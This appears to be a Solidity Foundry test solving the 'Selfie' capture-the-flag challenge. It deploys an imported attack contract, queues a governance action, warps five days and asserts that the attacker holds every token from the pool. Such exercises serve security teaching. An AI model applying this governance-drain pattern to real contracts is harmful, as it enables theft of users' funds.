// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/SelfieFixture.sol";

import "src/src-default/attacker-contracts/AttackSelfie.sol";

contract SelfieTest is SelfieFixture {

    AttackSelfie public attackContract;

    function setUp() public override {
        super.setUp();
    }

    function test_selfie() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        attackContract = new AttackSelfie(
            address(pool),
            address(token),
            attacker
        );

        attackContract.attack();

        vm.warp(block.timestamp + 5 days); // 5 days have passed

        governance.executeAction(1);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}